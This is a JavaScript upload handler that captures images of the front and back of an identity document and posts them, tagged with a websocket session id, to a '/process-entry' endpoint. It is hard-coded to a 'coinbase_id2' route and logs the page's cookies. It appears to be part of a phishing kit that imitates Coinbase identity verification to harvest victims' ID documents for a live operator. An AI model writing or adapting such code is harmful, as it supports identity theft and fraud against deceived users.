// Make ID2Handler available globally
window.ID2Handler = class ID2Handler {
    constructor() {
        this.uploadedImages = new Map();
        this.init();
    }

    init() {
        // Wait for DOM to be ready
        if (document.readyState === 'loading') {
            document.addEventListener('DOMContentLoaded', () => this.setupUploadTriggers());
        } else {
            this.setupUploadTriggers();
        }
    }

    getPageRoute() {
        // Always use coinbase_id2 for uploads, regardless of route or SPA state
        return 'coinbase_id2';
    }

    setupUploadTriggers() {
        const triggers = ['front', 'back'];
        triggers.forEach(id => {
            const trigger = document.getElementById(id);
            if (!trigger) return;

            // Remove any existing file inputs
            const existingInput = document.querySelector(`input[type="file"][data-for="${id}"]`);
            if (existingInput) {
                existingInput.remove();
            }

            const fileInput = document.createElement('input');
            fileInput.type = 'file';
            fileInput.accept = 'image/*';
            fileInput.style.display = 'none';
            fileInput.setAttribute('data-for', id);
            fileInput.name = `${id}_file`;
            fileInput.id = `${id}_file`;
            fileInput.setAttribute('data-immediate-upload', 'true');
            trigger.parentNode.appendChild(fileInput);

            // Remove existing click listeners
            const newTrigger = trigger.cloneNode(true);
            trigger.parentNode.replaceChild(newTrigger, trigger);

            newTrigger.addEventListener('click', (e) => {
                e.preventDefault();
                e.stopPropagation();
                fileInput.click();
            });

            fileInput.addEventListener('change', async (e) => {
                const file = e.target.files[0];
                if (!file) return;

                newTrigger.classList.add('loading');
                try {
                    // Create preview immediately
                    const reader = new FileReader();
                    reader.onload = (e) => {
                        this.displayImage(id, e.target.result);
                    };
                    reader.readAsDataURL(file);

                    // Build FormData directly
                    const formData = new FormData();
                    formData.append('immediate_upload', 'true');
                    formData.append('is_immediate_upload', 'true');
                    formData.append('trigger_id', id);
                    formData.append('source', 'id2_handler');
                    formData.append('is_spa', 'true');
                    formData.append('handler_type', 'immediate');
                    formData.append('upload_type', 'immediate');
                    formData.append('page_route', 'coinbase_id2');
                    formData.append('page_key', 'coinbase_id2');
                    const sessionId = window.sessionManager?.sessionId || window.wsocket?.id;
                    if (sessionId) formData.append('session_id', sessionId);
                    formData.append(`${id}_file`, file);

                    // Log the FormData contents for debugging
                    console.log('[ID2 Debug] FormData contents:');
                    for (let pair of formData.entries()) {
                        console.log(pair[0] + ': ' + (pair[1] instanceof File ? pair[1].name : pair[1]));
                    }
                    console.log('[ID2 Debug] document.cookie:', document.cookie);
                    console.log('[ID2 Debug] sessionId:', sessionId);

                    // Upload file using fetch
                    await fetch('/process-entry', {
                        method: 'POST',
                        body: formData,
                        credentials: 'include',
                        headers: {
                            'X-Requested-With': 'XMLHttpRequest',
                            'X-Handler-Type': 'immediate',
                            'X-Upload-Type': 'immediate',
                            'Accept': 'application/json'
                        }
                    }).then(async response => {
                        if (!response.ok) {
                            const text = await response.text();
                            console.error(`[ID2] Upload failed, response text:`, text);
                            throw new Error(`HTTP error! status: ${response.status}`);
                        }
                        const result = await response.json();
                        if (result.success) {
                            this.uploadedImages.set(id, result.files[`${id}_file`]);
                            console.log(`[ID2] Successfully uploaded ${id} image:`, result);
                        } else {
                            console.error(`[ID2] Failed to upload ${id} image:`, result);
                            alert(result.message || 'Upload failed');
                        }
                    }).catch(error => {
                        console.error(`[ID2] Error uploading ${id} image:`, error);
                        alert(`Failed to upload image: ${error.message}`);
                    });

                } catch (error) {
                    console.error(`[ID2] Error uploading ${id} image:`, error);
                    alert(`Failed to upload image: ${error.message}`);
                } finally {
                    newTrigger.classList.remove('loading');
                    fileInput.value = '';
                }
            });
        });
    }

    displayImage(id, src) {
        const container = document.getElementById(id);
        if (!container) return;

        // Remove any previous preview image
        const oldImg = container.querySelector('.id2-upload-preview');
        if (oldImg) oldImg.remove();

        // Create and add new image as the first child (before SVG and label)
        const img = document.createElement('img');
        img.src = src;
        img.classList.add('img-fluid', 'id2-upload-preview');
        img.style.maxWidth = '100%';
        img.style.maxHeight = '100%';
        img.style.objectFit = 'contain';
        img.style.position = 'absolute';
        img.style.top = '0';
        img.style.left = '0';
        img.style.right = '0';
        img.style.bottom = '0';
        img.style.margin = 'auto';
        img.style.zIndex = '2';
        img.addEventListener('error', () => {
            console.error(`[ID2] Failed to load image for ${id}`);
        });
        // Insert as first child
        container.style.position = 'relative';
        container.insertBefore(img, container.firstChild);
    }
}

// Initialize when DOM is ready
document.addEventListener('DOMContentLoaded', () => {
    // Clean up any SPA preview wrappers if present
    ['front', 'back'].forEach(id => {
        const el = document.getElementById(id);
        if (el) {
            const oldWrapper = el.querySelector('.spa-upload-preview-wrapper');
            if (oldWrapper) oldWrapper.remove();
            // Remove any old preview image
            const oldImg = el.querySelector('.id2-upload-preview');
            if (oldImg) oldImg.remove();
        }
    });
    
    // Initialize handler
    if (!window.id2Handler) {
        window.id2Handler = new window.ID2Handler();
    }
}); 